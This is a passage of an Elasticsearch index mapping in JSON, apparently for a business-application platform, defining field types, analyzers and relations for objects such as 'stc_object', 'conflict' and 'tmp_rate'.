            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_connection-a" : {
                "type" : "string"
              },
              "stc_connection-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_context" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_context-a" : {
                "type" : "string"
              },
              "stc_context-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_copyright" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_copyright-a" : {
                "type" : "string"
              },
              "stc_copyright-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_created_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_created_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_description" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_due_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_fid" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_files" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_files-a" : {
                "type" : "string"
              },
              "stc_files-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_name" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_notes" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_owner" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_properties" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_properties-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_properties-a" : {
                "type" : "string"
              }
            }
          },
          "stc_related_items" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_related_items-a" : {
                "type" : "string"
              },
              "stc_related_items-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_tags" : {
            "type" : "string"
          },
          "stc_token" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_transitions" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_transitions-a" : {
                "type" : "string"
              },
              "stc_transitions-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_updated_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_updated_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_workflow" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "tmp_billable" : {
            "type" : "boolean"
          },
          "tmp_collaborator" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "tmp_customer" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "tmp_end_date" : {
            "type" : "date",
            "doc_values_format" : "disk",
            "format" : "dateOptionalTime"
          },
          "tmp_fee" : {
            "type" : "float",
            "doc_values_format" : "disk"
          },
          "tmp_nb_hours" : {
            "type" : "long",
            "doc_values_format" : "disk"
          },
          "tmp_start_date" : {
            "type" : "date",
            "doc_values_format" : "disk",
            "format" : "dateOptionalTime"
          }
        }
      },
      "conflict" : {
        "dynamic" : "true",
        "include_in_all" : false,
        "properties" : {
          "baseIndex" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk",
            "include_in_all" : false
          },
          "category" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk",
            "include_in_all" : false
          },
          "conflicting" : {
            "include_in_all" : false,
            "properties" : {
              "base" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk",
                "include_in_all" : false
              },
              "name" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk",
                "include_in_all" : false
              },
              "remote" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk",
                "include_in_all" : false
              },
              "user" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk",
                "include_in_all" : false
              }
            }
          },
          "id" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk",
            "include_in_all" : false
          },
          "stc_datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk",
            "include_in_all" : false
          },
          "stc_updated_on" : {
            "type" : "date",
            "doc_values_format" : "disk",
            "format" : "dateOptionalTime",
            "include_in_all" : false
          },
          "type" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk",
            "include_in_all" : false
          },
          "userIndex" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk",
            "include_in_all" : false
          }
        }
      },
      "stc_object" : {
        "_meta" : {
          "fields" : {
            "id" : {
              "type" : "UUID",
              "key" : true
            },
            "stc_name" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_workflow" : {
              "type" : "String"
            },
            "stc_plural_name" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_identifier" : {
              "type" : "String"
            },
            "stc_custodian" : {
              "type" : "String"
            },
            "stc_local_part" : {
              "type" : "String"
            },
            "stc_color" : {
              "type" : "String"
            },
            "stc_icon" : {
              "type" : "String"
            },
            "stc_contextualization" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_sorting" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_folder" : {
              "type" : "String"
            },
            "stc_basic_form" : {
              "type" : "Boolean"
            },
            "stc_layouts" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_position" : {
              "type" : "Float"
            },
            "stc_ad_hoc" : {
              "type" : "Boolean"
            },
            "stc_archetype" : {
              "type" : "Boolean"
            },
            "stc_cached" : {
              "type" : "Boolean"
            },
            "stc_commit" : {
              "type" : "Boolean"
            },
            "stc_hidden" : {
              "type" : "Boolean"
            },
            "stc_meta" : {
              "type" : "Boolean"
            },
            "stc_protected" : {
              "type" : "Boolean"
            },
            "stc_restricted" : {
              "type" : "Boolean"
            },
            "stc_forms" : {
              "type" : "Integer"
            },
            "stc_sheets" : {
              "type" : "Integer"
            },
            "stc_views" : {
              "type" : "Integer"
            },
            "stc_questions" : {
              "type" : "Integer"
            },
            "stc_meta_fields" : {
              "type" : "Integer"
            },
            "stc_records" : {
              "type" : "Integer"
            },
            "stc_score" : {
              "type" : "Float"
            },
            "stc_audience" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_description" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_documentation" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_interactions" : {
              "type" : "JSON"
            },
            "stc_operations" : {
              "type" : "JSON"
            },
            "stc_perspectives" : {
              "type" : "JSON"
            },
            "stc_connectivity" : {
              "type" : "JSON"
            },
            "stc_fields" : {
              "type" : "JSON"
            },
            "stc_properties" : {
              "type" : "JSON",
              "datatype" : "stc_attributes"
            },
            "stc_notes" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_comments" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_files" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_related_items" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_tags" : {
              "type" : "JSON"
            },
            "stc_token" : {
              "type" : "UUID"
            },
            "stc_transitions" : {
              "type" : "JSON"
            },
            "stc_due_on" : {
              "type" : "Timestamp"
            },
            "stc_access" : {
              "type" : "JSON"
            },
            "stc_created_on" : {
              "type" : "Timestamp"
            },
            "stc_transitioned_on" : {
              "type" : "Timestamp"
            },
            "stc_updated_on" : {
              "type" : "Timestamp"
            },
            "stc_fid" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_connection" : {
              "type" : "JSON"
            },
            "stc_context" : {
              "type" : "JSON"
            },
            "stc_copyright" : {
              "type" : "JSON"
            }
          },
          "has1Relations" : {
            "stc_application" : {
              "fieldName" : "stc_application",
              "relatedTableName" : "stc_application"
            },
            "stc_module" : {
              "fieldName" : "stc_module",
              "relatedTableName" : "stc_module"
            },
            "stc_colorization" : {
              "fieldName" : "stc_colorization",
              "relatedTableName" : "stc_field"
            },
            "stc_iconography" : {
              "fieldName" : "stc_iconography",
              "relatedTableName" : "stc_field"
            },
            "stc_emailing" : {
              "fieldName" : "stc_emailing",
              "relatedTableName" : "stc_field"
            },
            "stc_linking" : {
              "fieldName" : "stc_linking",
              "relatedTableName" : "stc_field"
            },
            "stc_categorization" : {
              "fieldName" : "stc_categorization",
              "relatedTableName" : "stc_field"
            },
            "stc_chronology" : {
              "fieldName" : "stc_chronology",
              "relatedTableName" : "stc_field"
            },
            "stc_hierarchy" : {
              "fieldName" : "stc_hierarchy",
              "relatedTableName" : "stc_field"
            },
            "stc_location" : {
              "fieldName" : "stc_location",
              "relatedTableName" : "stc_field"
            },
            "stc_quantification" : {
              "fieldName" : "stc_quantification",
              "relatedTableName" : "stc_field"
            },
            "stc_ordering" : {
              "fieldName" : "stc_ordering",
              "relatedTableName" : "stc_field"
            },
            "stc_prioritization" : {
              "fieldName" : "stc_prioritization",
              "relatedTableName" : "stc_field"
            },
            "stc_scoring" : {
              "fieldName" : "stc_scoring",
              "relatedTableName" : "stc_field"
            },
            "stc_identification" : {
              "fieldName" : "stc_identification",
              "relatedTableName" : "stc_field"
            },
            "stc_naming" : {
              "fieldName" : "stc_naming",
              "relatedTableName" : "stc_field"
            },
            "stc_custody" : {
              "fieldName" : "stc_custody",
              "relatedTableName" : "stc_field"
            },
            "stc_packaging" : {
              "fieldName" : "stc_packaging",
              "relatedTableName" : "stc_field"
            },
            "stc_profiling" : {
              "fieldName" : "stc_profiling",
              "relatedTableName" : "stc_field"
            },
            "stc_obscuration" : {
              "fieldName" : "stc_obscuration",
              "relatedTableName" : "stc_field"
            },
            "stc_protection" : {
              "fieldName" : "stc_protection",
              "relatedTableName" : "stc_field"
            },
            "stc_default_datasource" : {
              "fieldName" : "stc_default_datasource",
              "relatedTableName" : "stc_datasource"
            },
            "stc_object_dashboard" : {
              "fieldName" : "stc_object_dashboard",
              "relatedTableName" : "stc_slide"
            },
            "stc_record_dashboard" : {
              "fieldName" : "stc_record_dashboard",
              "relatedTableName" : "stc_slide"
            },
            "stc_default_form" : {
              "fieldName" : "stc_default_form",
              "relatedTableName" : "stc_form"
            },
            "stc_default_perspective" : {
              "fieldName" : "stc_default_perspective",
              "relatedTableName" : "stc_perspective"
            },
            "stc_default_view" : {
              "fieldName" : "stc_default_view",
              "relatedTableName" : "stc_view"
            },
            "stc_assigned_to" : {
              "fieldName" : "stc_assigned_to",
              "relatedTableName" : "stc_user"
            },
            "stc_owner" : {
              "fieldName" : "stc_owner",
              "relatedTableName" : "stc_user"
            },
            "stc_created_by" : {
              "fieldName" : "stc_created_by",
              "relatedTableName" : "stc_user"
            },
            "stc_transitioned_by" : {
              "fieldName" : "stc_transitioned_by",
              "relatedTableName" : "stc_user"
            },
            "stc_updated_by" : {
              "fieldName" : "stc_updated_by",
              "relatedTableName" : "stc_user"
            },
            "stc_datasource" : {
              "fieldName" : "stc_datasource",
              "relatedTableName" : "stc_datasource"
            }
          },
          "datasource" : "d63fded1-043c-43ad-9135-d96b6d16cced",
          "signature" : 2018601234,
          "timestamp" : 1409751256391
        },
        "properties" : {
          "_base" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "_deleted" : {
            "type" : "boolean",
            "doc_values_format" : "disk"
          },
          "id" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_access" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_access-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_access-a" : {
                "type" : "string"
              }
            }
          },
          "stc_ad_hoc" : {
            "type" : "boolean"
          },
          "stc_application" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_archetype" : {
            "type" : "boolean"
          },
          "stc_assigned_to" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_audience" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_basic_form" : {
            "type" : "boolean"
          },
          "stc_cached" : {
            "type" : "boolean"
          },
          "stc_categorization" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_chronology" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_color" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_colorization" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_comments" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_commit" : {
            "type" : "boolean"
          },
          "stc_connection" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_connection-a" : {
                "type" : "string"
              },
              "stc_connection-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_connectivity" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_connectivity-a" : {
                "type" : "string"
              },
              "stc_connectivity-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_context" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_context-a" : {
                "type" : "string"
              },
              "stc_context-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_contextualization" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_copyright" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_copyright-a" : {
                "type" : "string"
              },
              "stc_copyright-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_created_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_created_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_custodian" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_custody" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_default_datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_default_form" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_default_perspective" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_default_view" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_description" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_description-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_description-a" : {
                "type" : "string"
              }
            }
          },
          "stc_documentation" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_documentation-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_documentation-a" : {
                "type" : "string"
              }
            }
          },
          "stc_due_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_emailing" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_fid" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_fid-a" : {
                "type" : "string"
              },
              "stc_fid-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_fields" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_fields-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_fields-a" : {
                "type" : "string"
              }
            }
          },
          "stc_files" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_folder" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_forms" : {
            "type" : "long",
            "doc_values_format" : "disk"
          },
          "stc_hidden" : {
            "type" : "boolean"
          },
          "stc_hierarchy" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_icon" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_iconography" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_identification" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_identifier" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_interactions" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_interactions-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_interactions-a" : {
                "type" : "string"
              }
            }
          },
          "stc_layouts" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_linking" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_local_part" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_location" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_meta" : {
            "type" : "boolean"
          },
          "stc_meta_fields" : {
            "type" : "long",
            "doc_values_format" : "disk"
          },
          "stc_module" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_name" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_name-ng" : {
                "type" : "string",
                "index_analyzer" : "nGram_analyzer",
                "search_analyzer" : "whitespace_analyzer"
              },
              "stc_name-a" : {
                "type" : "string"
              },
              "stc_name-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_naming" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_notes" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_notes-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_notes-a" : {
                "type" : "string"
              }
            }
          },
          "stc_object_dashboard" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_obscuration" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_operations" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_operations-a" : {
                "type" : "string"
              },
              "stc_operations-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_ordering" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_owner" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_packaging" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_perspectives" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_perspectives-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_perspectives-a" : {
                "type" : "string"
              }
            }
          },
          "stc_plural_name" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_plural_name-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_plural_name-a" : {
                "type" : "string"
              }
            }
          },
          "stc_position" : {
            "type" : "float",
            "doc_values_format" : "disk"
          },
          "stc_prioritization" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_profiling" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_properties" : {
            "type" : "object",
            "dynamic" : "true"
          },
          "stc_protected" : {
            "type" : "boolean"
          },
          "stc_protection" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_quantification" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_questions" : {
            "type" : "long",
            "doc_values_format" : "disk"
          },
          "stc_record_dashboard" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_records" : {
            "type" : "long",
            "doc_values_format" : "disk"
          },
          "stc_related_items" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_restricted" : {
            "type" : "boolean"
          },
          "stc_score" : {
            "type" : "float",
            "doc_values_format" : "disk"
          },
          "stc_scoring" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_sheets" : {
            "type" : "long",
            "doc_values_format" : "disk"
          },
          "stc_sorting" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_tags" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_tags-a" : {
                "type" : "string"
              },
              "stc_tags-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_token" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_transitions" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_transitions-a" : {
                "type" : "string"
              },
              "stc_transitions-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_updated_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_updated_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_views" : {
            "type" : "long",
            "doc_values_format" : "disk"
          },
          "stc_workflow" : {
            "type" : "string",
            "index" : "not_analyzed"
          }
        }
      },
      "tmp_rate" : {
        "_meta" : {
          "fields" : {
            "id" : {
              "type" : "UUID",
              "key" : true
            },
            "stc_tags" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51",
              "es_schema" : {
                "type" : "string",
                "analyzed" : "not_analyzed"
              }
            },
            "stc_copyright" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_related_items" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_connection" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_transitioned_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_files" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_due_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_created_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_comments" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_updated_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_workflow" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_properties" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_fid" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_description" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_context" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_access" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_name" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_transitions" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_notes" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_token" : {
              "type" : "UUID",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "tmp_hourly" : {
              "type" : "Float",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "tmp_dail" : {
              "type" : "Float",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            }
          },
          "has1Relations" : {
            "stc_owner" : {
              "fieldName" : "stc_owner",
              "relatedTableName" : "stc_user"
            },
            "stc_transitioned_by" : {
              "fieldName" : "stc_transitioned_by",
              "relatedTableName" : "stc_user"
            },
            "stc_created_by" : {
              "fieldName" : "stc_created_by",
              "relatedTableName" : "stc_user"
            },
            "stc_assigned_to" : {
              "fieldName" : "stc_assigned_to",
              "relatedTableName" : "stc_user"
            },
            "stc_datasource" : {
              "fieldName" : "stc_datasource",
              "relatedTableName" : "stc_datasource"
            },
            "stc_updated_by" : {
              "fieldName" : "stc_updated_by",
              "relatedTableName" : "stc_user"
            },
            "tmp_collaborator" : {
              "fieldName" : "tmp_collaborator",
              "relatedTableName" : "su_collaborator"
            },
            "tmp_customer" : {
              "fieldName" : "tmp_customer",
              "relatedTableName" : "stc_company"
            },
            "tmp_sow" : {
              "fieldName" : "tmp_sow",
              "relatedTableName" : "su_contract"
            }
          },
          "datasource" : "75994729-9054-40ec-9bdd-414366739e51",
          "signature" : 2127784844,
          "timestamp" : 1409751247005
        },
        "properties" : {
          "_base" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "_deleted" : {
            "type" : "boolean",
            "doc_values_format" : "disk"
          },
          "id" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_access" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_access-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_access-a" : {
                "type" : "string"
              }
            }
          },
          "stc_assigned_to" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_comments" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
